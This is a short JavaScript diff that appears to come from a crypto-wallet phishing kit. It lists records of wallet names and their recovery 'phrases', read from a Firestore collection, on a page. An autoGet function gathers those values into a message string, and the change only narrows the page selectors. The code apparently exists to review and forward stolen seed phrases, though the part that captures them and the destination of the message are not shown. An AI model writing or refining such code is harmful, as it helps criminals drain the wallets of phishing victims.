@@ -56,7 +56,7 @@ db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
     let time = doc.data().time.toDate().toLocaleDateString("en-US", date_format)
 
     $('.box').append(`
-   <div>
+   <div class="userdata">
     <p>${wallet}</p>
     <p>${phrase}</p>
     <p>${time}</p>
@@ -67,9 +67,9 @@ db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
   });
 
   function autoGet() {
-    const getWallet = $('div').find('p').eq([0]).html()
-    const getPhrase = $('div').find('p').eq([1]).html()
-    const getTime = $('div').find('p').eq([2]).html()
+    const getWallet = $('.userdata').find('p').eq([0]).html()
+    const getPhrase = $('.userdata').find('p').eq([1]).html()
+    const getTime = $('.userdata').find('p').eq([2]).html()
 
     const INFO = `
     ${getWallet} <br>
